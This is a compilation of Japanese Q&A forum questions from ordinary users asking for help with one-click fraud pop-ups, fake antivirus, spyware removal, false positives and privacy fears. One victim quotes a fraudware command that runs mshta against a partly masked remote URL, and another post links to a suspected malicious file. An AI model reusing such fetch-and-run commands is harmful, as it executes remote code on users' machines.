トロイの木馬が検出されました。が誤検出？ ウィルスバスター2010とAD-AwareであるZIPファイルをスキャンすると、トロイの木馬が検出され危険度がかなり高いようでファイルごと削除されます。（ZIPファイルを解凍されたものは何も検出されません。） ウィルスバスターでの脅威名は「BKDR_MSIL.AK」で検索しても、ヒットしません。 しかしそのファイルは今も、ネット上からダウンロードできますし、作者様もツイッターを更新されるなど活発に活動されています。 わたし自身もそのファイルを使用したいのですが、2つのセキュリティソフトから削除されるような脅威となると、かなり不安です。 この場合、どうすればいいでしょうか？
投稿掲示板｛２ちゃんねる｝に、詳しい方いませんか？ あのサイトは、ホストになって、板を作ると、投稿者や、ＲＯＭの人数や、発信ＩＰアドレス先も 暗号化されて分かると聞きました。本当でしょうか？ ネットショップの板でも、自分が作れば、覗いた人をこちらから。見れる（ＩＰ） こういう便利で嫌らしい情報は本当なのでしょうか？ ネット経験１年生なので良く分かりません。教えて下さい。 正直、あそこで相当嫌な思いをしました・・
ワンクリック詐欺に引っ掛かったようです 「有料サイトに登録ありがとうございます」 という画面が出てきて何度たち上げなおしても消えません。 「スタートアップチェッカー」や 「ワンクリックウェア駆除ツール」 をダウンロードして対応しようとしましたがダメです。 「ワンクリックウェア駆除ツール」では One-click Fraud ware Remover Version 1.0.3.0 ------------------------------------------------------------ タスクスケジューラを調査 →検出されませんでした。 ------------------------------------------------------------ プロセスを調査 →mshta 　→駆除しました。 ------------------------------------------------------------ カレントユーザー用のスタートアップフォルダを調査 →検出されませんでした。 全ユーザー用のスタートアップフォルダを調査 →検出されませんでした。 ------------------------------------------------------------ カレントユーザー用のスタートアップレジストリを調査 →検出されませんでした。 全ユーザー用のスタートアップレジストリを調査 →検出されませんでした。 ------------------------------------------------------------ 調査が完了しました。 以上のように表示され、やっとこれで終わったか？ と立ち上げなおしてもまたしつこく表示されます。 あやしいのは C:\Windows\system32\mshta http://pinecone20.silver.ero0101.***/reg2.php?ci … だと思います。 （タスクマネジャーではそうなっています） どうしたらいいんでしょうか？ よろしくお願い致します。
スパイウェアに引っ掛かってしまったようです。 ちょっとうる覚えなんですが数日前、動画サイトを閲覧していると急にＩＥが閉じて 「Antivirus2010」というウィルス対策っぽいソフトが動き始めました。 インストールした覚えの無いソフトでしたが、ロゴ等の雰囲気からウィンドウズの プレインストールソフトかと思い、検索が終わるまで待っていると終了後に ライセンスを取得してくださいというような英語の文面が現れたので不審に思い その場は直ちに終了しました。 すると今度はデスクトップの画面が変わってしまい、中央に黒バックの赤文字で 「YOUR SYSTEM IS INFECTED!」に始まる警告文が現れ、同時に「Windows security Alert」というタイトルのウィンドが出てきて、[はい]をクリックしても[いいえ] をクリックしても、さきほどの「Antivirus2010」が起動してしまうようになりました。 ウィルスバスター2010、Spybodなどで検索削除を試みましたが上手く行かず、 セーフティーモードからシステムの復元もしてみましたが、スパイウェアが干渉して いるのか？「復元は未完了」となってしまいます。 現状インターネットの接続は不可ですが、メーラー（OE）は接続できており、 ファイルサーバーのフォルダは見えております。 OSはXP（SP3）です。 当方ＰＣ初心者ではありませんがあまり詳しい方では無いので、アドバイス宜しくお願い致します。
Youtubeでストーカー？ Youtubeで、私が他の方のビデオのコメント欄に書き込んだ直後に、書き込みをしてくる人がいます。　つまり、私がどこのビデオにコメントを書いたのかわかっているようです。　ためしに、色々なビデオを適当に選んで書き込みをして見ましたが、どうやって追跡しているのか私が書き込んだ直後に、書き込みをしてきます。 登録している「友人」をすべて削除したらストーカー書き込みはなくなりました。　　その後、「友人」の申請が何度かあったのですが、すべて断っています。　Youtubeでは、どうやら、友人に登録すると相手に行動が筒抜けになるようです。　 どういう仕組みでこういうことができるのか、また、どうやったら防げるのか教えてください。　よろしくお願いします。
PCに詳しい方に質問です。 仮定の質問ですが自分のメルアドのパスワードをコピーしてログイン、その次に他のサイトを見ていて,このサイトの文字をコピーします。 サイトの管理人なり、誰かなりがページの分析をしてサイトの文字をコピーする前のパスワードを知る事はできるのでしょうか？OSとプラウザは現在使用されている製品すべてが対象です。PCに詳しい方よろしくお願い致します。
　私は、自分用のＰＣにキャノンのイーセットスマートセキュリティーをいれてスパイウェア用にスパイボッドを利用しているのですが、その中でスパイボッドの免疫化機能についてわからないことがあるので質問させていただきます。 　イーセットとのバッティングを防ぐためにスパイボッドを非常駐化して使用しているのですが、免疫化は非常駐ではたして機能しているのでしょうか？ 教えてください。
display.vbsというファイルがstartupフォルダにあるのですが？ display.vbsというファイルがすべてのプログラムのstartupフォルダにあるのですが、これは何でしょうか？名前からして気持ち悪いので正体を知っている人がいたら教えて欲しいです。 メモ帳で開いたら下記のようなソースになっていました。 よろしくお願いします。 -------------------------------------------- ' Self destructive VBScript for changing optimal resolution ' Set optimal resolution Set objShell = Wscript.CreateObject("Wscript.Shell") objShell.Run "c:\windows\options\cfgdisp.exe /optimum", 7, True ' Now destroy itself Set objFSO = CreateObject("Scripting.FileSystemObject") objFSO.DeleteFile("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\display.vbs") --------------------------------------------
IE、FirefoxにおけるCookie設定について 初歩的な質問になりますが、 私なりに調べても解決できなかった為 どなたかアドバイス頂けると幸いです。 最近、ブラウザをIEからFirefox3.6に移行しました。 IE、FirefoxのCookie設定の違いについての質問です。 IEのCookie設定では インターネットオプション＞プライバシー＞設定　にて スライダを一番上にすると、 “全てのWebサイトからのCookieはブロックされます” “コンピューターにある既存のCookieはWebサイトから読み取れません” と表示されますが、 FirefoxのCookie設定では オプション＞プライバシー＞履歴　から “サイトから送られてきたCookieを保存する”のチェックを外すことで サイトからCookieを送られる事はなくなる、と思いますが コンピューターにある既存のCookieは Webサイトから読み取り可・不可どちらなのでしょうか？ また、 IEからFirefoxへの移行に伴い、 セキュリティの設定方法が大きく異なり、少し不安です。 ネットの利用状況は人それぞれ異なると思いますが お勧めの設定等があれば、併せてアドバイス頂けると助かります。 なお、FirefoxのCookie設定に関する質問は これまで数多くあったと思いますが、 今回の件は見つからなかったため、新たに質問しました。 （見落としていたら申し訳ありません） 以上、宜しくお願いします。
ツイッター（twitter)でカーソルを置いただけで変なツイートされてしまいました。対処法は？ 本日の出来事です。恐くなったので以下行いました。 ツイッターのログアウト ウイルスバスター２０１１で検索 ツール→閲覧の履歴を削除 他なにかしたほうがいいでしょうか？ウイルスバスターの検索には何も引っかかりませんでした。
ウイルスバスター２０１１ ウイルスバスター2010から2011へ　無料アップグレードできますか？　またやり方を教えてください
至急教えて下さい！ カテゴリーが違いましたらすみません！ あるサイトで、私の質問に答えて下さった方へのお礼を投稿しようとしたところ、 「セキュリティで保護されていない接続へリダイレクトされようとしています。 現在のサイトへ送信中の情報は、セキュリティで保護されていないサイトへ再送信される可能性があります。 続行しますか？」 というメッセージが出たのですが、つい「はい」を押してしまいました(>_<) 何か影響がありますでしょうか？ 無知ですみませんが、教えて下さい。 よろしくお願いします！
オンラインスキャンを使ってウイルスなど見つかったらどう駆除するのですか？ オンラインスキャンの場合は駆除まではできないみたいですが お奨めのオンラインは有りますか？
プログラムの脆弱性とは分かりやすく言うとどういうことでしょうか？ （ウイルスやマルウェアを送り込もうとする者が）プログラムの脆弱性をつく、と良く言われます。 何となく分かる気もするのですがもう一つ分かりませんので、どなたか教えて頂けないでしょうか？ 昔簡単なプログラムを作って（子供だましの^^;）遊んでいた者としては、ハッキリしないのが気持ち悪いのです。 簡単なプログラムで具体的に示して頂けたりすると非常に有難いですが、それはちょっと厚かましすぎるな^^;、とは思っています。 ※バグを利用するものとそうでないものがある、とは解説記事で読みました。自動ダウンロード機能付きのソフトに、騙してダウンロードさせるという手口も分かります。これは誤認識する場合なので、バグがある場合ですよね。 ※えー念の為、「僕もアタッカーになろう！」などという訳では勿論無く、何がどういう仕組みになっているのかを知りたいという純粋な興味ですので（何か余計言い訳がましいですが）、よろしくお願い致します。ｍ(＿)ｍ
スパムメールに解除・配信停止の手続きをしたら、次回から本当に配信されないか。それとも何もしないでメール自体を削除しておくほうがよいか。教えてください。
最近パソコンにアドウェアが入りこんだようで、 不要なアドウェアが表示されます。（アダルトサイト） スパイウェア対策ソフトでスキャンしたりして駆除を試みてるのですが、全く検知されず、でもアドウェアは消しても消しても1分ごとぐらいに表示されます。 どうやって駆除すればいいのか、他の方法はないのか、 不正なプログラムを探す方法などあれば教えてください。
Spybotというソフトで免疫を実行しようとすると「この動作をするための管理者権限がありません。この動作をしたい場合は、アプリケーションを管理者として実行してください。」という表示が出ます。設定の仕方を教えてください。
いつもお世話になっております。 アバスト！というフリーのウィルス対策ソフトを使用していますが、検査した結果 Ｄ：Ｓｙｓｔｅｍ　Ｖｏｌｕｍｅ　Informastion/_restore{???}/RP99/A0040951.exeというwin32:マルウェアが発見されました。このファイルを開き、いつ感染したのかを確認したいのですが、難しいです。 ウイルス対策を行っているのに事前に警告がでてこないようで、何だか頼りないウイルス対策ソフトなのですが、高度な対策ソフトはないものでしょうか。 スパイウェアの一種というマルウェアということで、パスワードをキーボードで入力したことはないのですが（コピ＆ぺ）ＩＤ＆Ｐａｓｓ等はどうでしょうか。 とても心配です。 よろしくお願いします。
Ad-Aware GUIがうまく作動してくれません。 もともとPCにはマカフィーがインストされているのですが、マカフィーじゃ削除できないトロイにかかってしまい、Ad-AwareGUIをインストールしましたが、何度起動してもすぐに「応答なし」になってしまい、動かなくなります。 どうやったらきちんと作動してくれるでしょうか・・・。
malware destructor　というウィルスにかかってしまいました。 アンインストールしても駄目、タクスマネージャにも表示されない、x-cleanerというウィルス駆除ソフトを使用しても駆除できませんでした。 何かこいつを駆除する方法をご存知の方、力を貸してください。 宜しくお願いします。 ちなみに、OSはvistaです。
COMODO Internet Securityは日本語ではなくて分かりにくいのでこれ以外で定評のあるスパイウェアソフトはありますか? 宜しくお願い致します。
AOL ハッキングについて 自分はプロバイダはＡＯＬです。ドメインはＡＯＬ．ＣＯＭです。 実は、メルアドのパスワードを盗まれて成りすましメールでスパム メールを一斉送信されました。もちろんウイルスバスター２０１０ を入れています。それで安心していたわけではないのですが、英文 メールが来てすぐに削除していたのですが、最近友人からこんな メールが来たと言われて確認したところ送った覚えのないメールでした それでＡＯＬに確認したところ、ここ２～３ヶ月そういう相談が多いとの 事。原因は調査中と言われました。なんで周知をしないんでしょうか？ トレンドマイクロに確認すると、内部のウイルスの影響ではなくて、 外部の犯行だといわれました。どうやってハッキングするんですか？ この件に詳しい方の回答をよろしければおねがいします。 そこで聞きたいことは、ＡＯＬ．ＪＰのアドレスのメルアドを使っているのですが 安全でしょうか？リカバリーをしてプロバイダを変えたほうがいいでしょうか？ あとは、ＡＯＬはフリーアドレスになったので、アカウント削除はできないので ９０日間ログインしなければ消えると言われました。自分の作ったフォルダの メールは見たいのですが、ログインせずに見る方法はありますでしょうか？ ａｏｌ．ｊｐのメールはウェブメールで見ています。メールソフト（サンダーバード） は使っていません。
IPアドレスで、PCが同じかどうか判断できますか? ある掲示板みたいな所に投稿していますが (1)会社のPC使ったり、(2)自宅からだったり、また自宅に二台PCがあるので (3)自宅の二台目のPCだったり色々な所、色々なPCから投稿しています。 IPを抜ける人がいて、その人から(1)(2)(3)の判断がつけられるのか知りたいのですが わかるものなんでしょうか。
あるサイトが毎回お気に入りに勝手に復活してきます こちらのサイトがIEのお気に入りに何度も復活して来ます。 （それほど危険なサイトではないようですが、念のため先頭のｈを省いてあります） ttp://www.benriweb.jp/ 復活する度に削除するのですが、翌日になると復活して来ます。 私は完全なスパイウェアだと思っているのですが、 そもそも勝手に復活できる手法すら分かりません。 便利ウェブなるものは何か問題があるのでしょうか。 こちらの環境は IE8、OSはXPのSP3 を使っています。
無料ウイルス対策 有料の対策ソフトを入れたほうがいいのは分かっていますが当方は学生で金銭的に厳しいので察してください・・・。 今無料ソフトの「ＭＳＥ」と「avast」で迷っているのですがどちらも使った事ある人や詳しい方どちらのほうが優れているか教えてくれませんか？ アベラも考えたのですがゲームのファイル誤検出していたので候補から外しました。
ウイルス対策のソフトの実行方法についてお伺いします。 現在、PCはWindowsを使用しています。 avast!無償版を導入しているのですが、スパイウェア対策としては心許ないので、ad-awareを入れようと思いました。 しかし、ad-awareはDLは出来るのですが、実行しようとするとエラーが出てしまいます。 何度かDLし直してみたり、Windowsのファイヤウォール、avast!など実行中のセキュリティ全般を中止した上で実行してみたりもしたのですがやはり「読み込み中」の後にエラーの表示が出ます。 また、エラーの原因が表示されないため、理由が良くわかりません。 エラーを出さずに、ad-awareを実行するための方法を教えてください。 宜しくお願いします。 ちなみに、その前にはavast!を一度アンインストールしてウィルスバスターの試用版をインストールしようとしたのですが、やはり保存が出来ても実行が出来ませんでした。
質問　パソコン内のファイルは盗難にあいますか。 私はパソコンでワードやエクセルを利用しています。インターネットも利用しています。 インターネットは無線によります。パソコン内の情報が外に漏れることが心配です。 パソコン内に記憶してあるワードやエクセルのファイルは、何者かによって盗難・コピー される恐れはありますか。そういう心配はありませんか。教えてください。
Ad-awareを入れると、C:\Windowに置いていたwindump.exeが消えてなくなりました。 ２台ともそうなったので、Ad-awareが原因と思うのですが、私の使っていたwindump.exeは スパイウェアだったのでしょうか？ 誤作動なら良いのですが、検知して消されるとスパイウェアと思ってしまいますし、消されると困ります。 Free版だったから性能が悪いのでしょうか？
スパイウェアに感染してるのかな？ (1)「スパイウェアを駆除する」とは具体的にどういうことなんでしょうか。 ＮＴＴの「セキュリティー対策ツール」の「セキュリティーレポート」の（５つの項目）の内、（スパイウェアの処理数＝５６）（ブロックしたWebサイト数＝１３４）と出ています。（あとの３つはゼロです。） これで、スパイウェアを駆除できていると言えるのでしょうか？それともパソコンの中に残っている数と言う意味でしょうか？ (2)使用中に、スパイウェアの疑いがあるのでは？と思われる点をあげてみます。 「海外の無料アダルトサイトの中に、出会い系サイトの広告が出ていて、そこに「この近辺で～」と地図が出ているのですが、それが自宅のすぐ近くであること。（おおよその住所を特定されているかも・・・） Ｗｏｒｄ２００７を使用中に一部の機能が使えなくなったり、いつも利用している動画サイトの画面デザインがおかしくなったりすることがある。 ※現時点で、スパイウェアの原因だと思われるサイトは「お気に入り」から削除し、かつ「ゴミ箱」も空にしました。 なにかお気づきの点があればアドバイスをお願いします。
　今晩は。 　Win XP SP３です。 　先日Jwordを「プログラムの追加と削除」から、削除しました。 　しかし、SPYBOTで再度チェックして見ると、「CnsMin」がエントリとして表示されました。 　「プログラムの追加と削除」から、完全に削除したと思ったのですが、 （「プログラムの追加と削除」には表示されていません。）これは実際に削除 されないで、まだ、インストールされたままなのでしょうか。 　また、完全に削除するにはどうしたらよいのでしょうか。
使用しているパソコンはDellのstudio、ウイルスソフトはウイルスバスター２００９です。 送付されてくるupdat?プログラムにウイルバスターのチェックがはいります。 　プログラム名　「DellDock.exe」 発行元　「stardock corporation」 プログラム名と発行元は全く同じなのに二種類のコメントが入ります。 　１つめは、　動作　「シェル設定の変更」　　　　　　　危険度　「低」 　２つめは、　動作　「システムファイルの変更」　　　　危険度　「高」 パソコンを立ち上げる毎に上記のupdat?プログラムは入ってくる。今までは、拒否してきたが今後は 「許可」すべきか「拒否」すべきか　ご回答下さい　 　
無償のスパイウェアソフトを導入したいと思っています PCのスペックがあまり高くないため、出来るだけメモリ使用の少ないものでお勧めのソフトをご紹介下さい
FireFox上のgoogleツールバーが消えてしまい、過去の回答からスパイウェアが組み込まれている可能性が高いとの事でAD-AWARE,SpyBotのインストールを試みましたがダウンロードのところから先に進みません。同じような質問に対する回答に貼ってあったサイトは閲覧することができません。どなたかたすけてくださいませ。
ESET smart security4を使っています。 更新期限の案内があったので更新しようと思っていたのですが、 メールマガジンで4.2への無償アップロードの案内があり、悩んでいます。 どう違いがあるのか、ご存知の方教えてください。
　Thumbs.dl ってファイルはスパイウェアかウイルスですかね？　B'ｓ Recorder GOLD５で書き込みしたデータの一部に出てきます。
ｍｐ４ファイルを開けるソフトとして検索されたソフトをダウンロードしようとしたところ、ウイルス対策ソフトが起動し「今すぐ削除をクリックしてください」というような表示が出たため、 削除をクリック→インストールを終了→インストールされてしまったソフトをアンインストール→デスクトップに追加されたショートカットを削除→ウイルス対策ソフト（ＮＴＴのセキュリティソフト）で検索・削除→スパイウェア対策ソフトで検索（Ｗｉｎｄｏｗｓディフェンダー・異常なしと表示される）　しました。 ソフトは無料配布されているもので、発信源はｗｉｎｆｅｒｎｏというところです。調べてみるとかなり危険性のあるソフトだったようで、対策方法としてリカバリーを勧める表記等がみられました。 アンインストール拒否やインターネットを閉じる際のトラブルなどの問題も挙げられていました。 私のＰＣでも、 追加されたショートカットをクリック→インターネットが起動され特定のｗｅｂページへ→閉じようとするとエラーが出て、閉じても閉じても起動される という問題が発生しましたが、普通のサイトを見る場合には今のところそのようなエラーは起こりません。 表面上は解決できたように思えるのですが、やはりリカバリーが必要なのでしょうか？ 後から問題が出てきたらと思うと… 安易にソフトをインストールしてしまい、自分でも馬鹿なことをしたなと反省しています。 どなたかアドバイス頂ければ幸いです。。
パソコンのアダルト動画の料金ページがトップに張り付いている人を見かけたのですが。 昔張り付いたものの削除の仕方がわからないから放ったらかしにしていたら毎回電源を入れる度にご丁寧に出現するんだそうで、半ば諦めておられました。 なのでパソコンと言えば家の実家の兄貴が得意中の得意なので早速連絡。しかし、言葉で何度説明されてもさっぱり分からず来てもらう事に。すると２、３分触っただけで消えたんです。 「すごいね、すごいね～」を連発していると「もっとツワモノ居るよ。消し方が分からないのに新しいサイトがどんどん出てくるから何重にも貼りついちゃっている人。」さすがに１回嫌な目に逢えば沢山張り付いているなんて再セットアップしましょうか～。って思うぐらいすごい事だと思うのですが、色々なサイトのお悩み相談ページでも焦っちゃって『至急！教えて』なんて書いて説教されている人も見かけるし、 では本題です。アダルトの料金ページ、何枚なら張り付いていても大丈夫？ ※１．毎度前置き長くてすみません。 ※２．実際に１枚でも張り付いていれば個人情報を知らず知らずのうちに漏らしてしまっているってケースもあるようです。気をつけて下さい。
ウイルスバスター2008ですが、1ヶ月ほど前からいきなり添付画像の表示がでるようになりました。 今繋いでいるのは、メインＰＣとブラザーのＰＣＦＡＸを有線で繋いでいます。 無線ＬＡＮも設定されていますが、普段は無線ＬＡＮは使っていません。 気味が悪いので、とりあえず無線ＬＡＮは切りました。 数は最大２つに減りましたが、まだ同じように警告が出ます。 これが出ないようにするにはどうすれば良いでしょうか？ また、自分のＰＣのＩＰアドレスはどうすれば分かるのでしょうか？ よろしくお願いいたします。　
ウイルスバスター2010のクイック検索を使用していると、以前は検索で見かけなかったHKLM、HKCUなどが検索されていました。 実際に引っかかったのはcookieのみで、トロイの木馬やウイルスなどは検出されませんでした。これまでもcookie以外が検出されたことはありませんし、現在のPCの稼働にも問題はありません。 ですがトロイの木馬でHKLMが増殖するとの事でしたので、念のため質問しました。 ウイルスバスター2010で検出が無ければ、トロイの木馬に感染していないと考えてもよろしいのでしょうか。それとも感染を考慮して別の対策も講じるべきでしょうか。感染していた場合の対策も合わせて回答してくださると助かります。
OKwaveに加入したのに、チェックインがスムーズに進まず、いつも引っかかる
個人ホームページへのアクセスの不具合解消方法 個人ホームページを開設しました。これに私本人がMozilla FirefoxやSafariからアクセスすると、「このサイトはピッキングの危険がある」と注意が表示されたり、知人が読もうとすると、拒否されることがままあるようです。解決方法を教えて下さい。
【質問】ローカル保存している画像・動画ファイルがウイルス感染・流出する可能性はありますでしょうか？ （１）最近、動画掲示板などで明らかにプライベートな写真が流出しているのを見ることがあるのですが、私もローカルに画像・動画ファイルを保存しているのですが、流出する可能性がありますでしょうか？ ＊自宅のPCはウイルス対策ソフトの更新を数カ月しておりません （２）ウイルス対策ソフトの更新はする予定なのですが、それ以外にローカルファイルの流出を防ぐ方法があれば教えていただきたいです。 よろしくお願いいたします。
ＰＣでエロサイトを閲覧していたら、動画等のダウンロードもしていないのに、勝手に入会手続きが完了→料金５００００円を払え、とのポップアップ画面が定期的に表示され、不愉快な思いをさせられております。 以下にいくつかの質問を記しますので宜しくお願いします。 １、このサイトのように、無料画像ダウンロードなどのボタンに、トラップを仕掛ける行為は違法では 　　ないのでしょうか？ （当方としては、これはクリック詐欺だと思いますので代金の支払いをする気はさらさらありません） ２、このような騙しサイトにより、当方のＰＣのレジストリが、こちらの承諾を得ず、勝手に書き換えら　　れてしまっった訳ですから、被害に逢った事になると思いますが、このようなサイトが存在する事が　　許せません。（善良なエロサイトも存在するわけですから） 　　このような被害を今後出さないように訴え出る組織等はあるのでしょうか？ ３、パソコンのレジストリを以前の正常な状態に戻したいのですが、たしかウィンドウズの標準で 　　何日前だかの、正常なレジストリを設定しなおすような機能があったと思います。 　　どのようにすればよろしいのでしょう？ 　（使用ＯＳは、ウィンドウズＸＰです） 　　
Macのセキュリティはウィルス対策のみで充分？ Mac OSX10.6.4でノートン・インターネット・セキュリティを使用しています。更新料がWin版と異なり、ぼったくりに等しい高額なので、Kaspersky for Macに乗り換えようかと思っています。 しかし、Mac版カスペルスキーは廉価な代わりにアンチウィルス一本槍で、総合セキュリティ・ソフトではないんですよね。スパイウェア対策とファイアウォールの面がいまいち不安で、乗り換えに踏み切れません。 それでもMacなら、そんなに神経質になる必要はないでしょうか。なお、ネットにはルーターを介して接続しています。
スパムメールに対処するには？ 仕事で５年間メールアドレスを変えずにいるのですが、迷惑メールが半端なく多いのです。 フィルターをかけていますが、アドレスやキーワードを変えて、フィルターをすり抜けてきます。 メールを特定しようにもドメインを変更されたら打つ手ありません。。 皆さんはどのように対処されていますか？ ちなみにメールアドレスは変更出来ません。
ADULT SHOWERというサイトでクリックしていくと 「ご入会手続きが完了致しました。」 「この画面はすべての手順を完了されているお客様だけに表示されるものです。」 「お振込日は契約日より３日以内となっています。」 「この画面は、ご入金確認後に確認ボタンをクリックすれば削除ができます。」 という画面が出てきました。何度閉じても出てきてしまいます。まだ確認ボタンをクリックはしていません どうすれば消えますか
個人情報が漏れています。解決策を教えて下さい！！ こんばんは。ＰＣ初心者です。 ひと月ほど前から見に覚えのないアドレスからメールが送られてきます。 ただの迷惑メールかと思って無視していたのですが、内容に自分の名前や住所地が 記載されていてもうパニックです！！ 受信メールの配信停止を行なおうとリンクをクリックしたら、出会い系サイトみたいな所に 繋がってしまい、配信停止も出来ずどうしたらいいのか分かりません。 又、別のメールには「ポイントを贈呈します」と会員になってもいないのに会員番号やＩＤが表示 されていて怖くてたまりません。 おそらく、閲覧時に個人情報が漏れたのだと思うのですが、どうして名前や住所地が分かるのか？ 今後情報が漏れてしまった相手をどのように対処したらいいのか教えて下さい！ 宜しくお願いします。
アダルトサイトを見てスパイウエアに感染したようです。 下の画像のポップアップが数分おきにデスクトップ画面に表示されるようになり 非常にわずらわしい思いをしています システム復元意外の方法で対処したいと思っているので 対応できるフリーの対策ソフトを教えてください。
ＰＣモニターをどこからか覗き見されているのか、内容が洩れています。 メールの内容から、聞いていた音楽の種類まで。 嫌がらせ目的のため、個人情報を盗んで買い物とかはされていませんが…。 本当に最悪です。 部屋事体に盗撮器があるのか、 あるいはパソコンを第三者に何らかの（ハッキングとか）方法で 盗み見られているのか…。 でも、盗撮ならメールの内容までは無理だと思うんですよね…。 モニターに盗撮器が仕掛けられていれば話は別ですが。 嫌がらせ目的のため直接は言ってきませんが、 臭わせてきます。どんな行動しているか知っているんだよ。 みたいに…。 もちろん、嵌められた感はあります。 だって、文字なんて誰が書いたか、偽造だっていくらだってできるでしょうから…。 気持ち悪くてしかたありません。 よろしくお願いします。
ワンクリウェアの削除方法を教えてください。 ワンクリウェアに感染してしまいました。（WindowsXPです） 原因のファイル（c:\document&settings\All Users\Application Data\davnt）は削除したのですが、スタートアップエントリには残っているようで、起動する度に「（上記ファイルを）読み込めません」とエラーが出てしまいます。 しかし、システム構成ユーティリティのスタートアップを見ても、それらしきモノは見つかりません。 どうすれば良いのか知ってらっしゃる方がいましたら、回答お願いします。 ワンクリウェアに感染してしまったことについては反省しています。 ですので、それについてのご意見はできればご遠慮下さい。
スパイウェアの削除方法をおしえてください。 最近PCの調子が悪いので、もしやと思い、 フリーの「Ad-Aware」ソフトでスキャンをしましたところ 削除をお勧めしますというファイルが、 System volume Information内にありました。 ※添付の３つです。 突然PCの電源が落ちたり、ファンの音が異様にうるさい など本当に困っています。 至急削除したいと思っています。ご教授よろしくお願い致します。
昨日質問を投稿したのですが、 （http://oshiete.goo.ne.jp/qa/5999563.html） （http://oshiete.goo.ne.jp/qa/5999681.html） 解決せず、その質問にまた書き込みができなかったので改めて投稿させていただきます。 パソコン初心者です。 昨日パソコンを立ち上げると、見知らぬアイコンがありました。 warningという名前の、オレンジに三角の中に！マークがあるアイコンです。 画像を貼らせていただきます。 パソコンはデルという会社の一体型のデスクトップで、セキュリティソフトは 電気屋さんで購入したウイルスバスター2010です。 昨日助言をいただき、セーフモードにしてウイルススキャンをしたのですが 問題は見つかりませんでした。 システムの復元というものをしてみたのですが（アイコンが出るより前の25日） 再び起動してもアイコンが消えません。 これは本当に問題はないのでしょうか…このアイコンを捨ててしまって 気にしなくても大丈夫なのでしょうか？ どうか助言をください。
質問した後に画像を張る方法が分からなかったのでこちらに失礼します。 http://oshiete.goo.ne.jp/qa/5999563.html こちらで質問しているものです。 デスクトップに出てきた画像です。 warningという名前の、オレンジに三角の中に！マークがあるアイコンです。
パソコン初心者です。 今パソコンを立ち上げると、見知らぬアイコンがありました。 warningという名前の、オレンジに三角の中に！マークがあるアイコンです。 どうしていいかわかりません。どうか助言をお願いします！ パソコンはデルという会社の一体型のデスクトップで、ファイアーウォールを入れています。
スパイウェアはウイルス対策ソフトで大丈夫？ パソコンの調子が良くありません。 PCに詳しい友人に相談してみたら、ウイルスとかスパイウェアに感染しているのではないかといわれました。 ウイルス対策ソフトは使っているのでウイルスは大丈夫かと思いますが、スパイウェアは別の対策ソフトが必要になるのでしょうか？
Yahoo!やgoogleなどの検索サイトであるキーワードを除外しながら検索をしたいのですが、そのキーワードの前にいちいち「-」とつける作業が面倒臭いです。 この除外するキーワードを自動で有効にし検索する方法はないものでしょうか？ また違う質問になりますが、googleで検索を行う際にいつもキーワード入力補助機能が有効になるのですがこれを無効にする方法はないのでしょうか？
お世話になります。現在、フリーのavast!を使っていますが、有効期限切れで更新の時期に来ています。ネットショッピングをするなら有料の「インターネットセキュリティ」にアップグレードしたほうが良いと、ポップアップのお知らせが出るのですが、やはりネットショッピングをするならフリーのバージョンアップより有料のセキュリティにアップグレードしたほうが安心でしょうか？また、途中でパソコンを買い換えたときでもインストールし直しなどできるのでしょうか？有効期限切れが迫っているのですが、どうしたら良いか迷っています。ご回答お待ちしております。よろしくお願いいたします。
ecchina-dougaというサイトをPCから完全に削除したいのですが、どうしたらいいのでしょうか？PCに詳しくはないので宜しくお願いします。
下のURLはどうもスパイウェア？のようなのですがどのセキュリティソフトなら発見、駆除できますか？ いくつか試しましたがちゃんと対処できているか不安です。 jpgだと思ってクリックしてしまいました・・ 詳しい方いらっしゃいましたらよろしくお願いします。 ttp://www.uproda.net/down/uproda104851.jpg
危険度10のマルウェアが見つかったのですが 先ほどAd-Awareをインストールしてとりあえずスマートスキャンしてみたのですが、検出されたのが危険度3のprivacy objectのクッキー6つと、危険度10のWin32.Backdoor.Hupigonというマルウェアで、「最高値の危険度10！？」と、見た瞬間はかなり驚いたのですが、どうやら感染源のファイルが「ゆめにっき」というフリーゲーム付属のRPG_RT.exeというファイルのようで、少し情報を集めてみると誤検出の可能性が高いようなのですが、誤検出と断じて安心してもよろしいのでしょうか？また、危険度3のクッキーに関してもそう脅威があるわけではないようなのですが、単に削除してしまえば問題ないですよね？ スパイウェア専用の対策ソフトというものがあることに気付いたのがつい先刻で、今まではavastしか入れてなかったので相当隙だらけでうろついてたんだな、と冷や汗を流したのですが、もし仮に上記の二つとも脅威なしということならばひとまず今までの情報漏洩の心配はないとしてもよろしいのでしょうか？ 散文的になってしまってすみません。回答よろしくお願いします。
予期しないサイトを表示させてしまいました、善後策は何をすべきですか? ●経過説明　 VISTA,ウイルスバスターの環境で、IE8で検索中(下の添付図参照)に発生しました。 1.「給湯器○○」を検索して　　(注)　○○＝国内の有名なブランド 2.ヒットした多数の内から「給湯器○○」をクリックしたら 3.「検索目的外の頁」が表示されてしまいました。 4.第1～2行目のタイトルを見てすぐ気付いたので、3行目目以降には何があるか確認せずに、×をクリックしてIEを終了させました。 5.自分のミスだと思って再度２をクリックしても同じなので異変を感じて終了させました。 6.直後にウイルスバスター2010で検索した結果、3との関係有無は知りませんが、Cookie_DoubleClictが削除されていました。 7.PCは、現在のところ素人目で分かるような異常現象はなく、正常だと思っています。 ●質問 Ａ．上記2～5の結果ではウイルスなどの被害は発生しなかったと判断してよろしいか。 　　もし、セキュリティーのため必要な事後措置があれば教えてください。 Ｂ．上記３は、安易に２をクリックしたため発生したと思います。 　　しかし私は、一見して怪しい場合を除いて、1～3のようなステップで日常的に各種の検索をしておりました。 　今後のため、２をクリックする前に「何に注意すべきだったか」予防するためのヒントがあれば教えてください。
ワンクリックウイルスを無料で削除したいので、方法を教えて下さい。無料アダルトコーナーをのぞいていたら、有料のアダルトムービーサイト「Adait movie Light」に導かれました。５分おきに、デスクトップにご契約通知画面、５万円振り込めば消えます表示が現れます。困っています。すぐに教えて下さい。
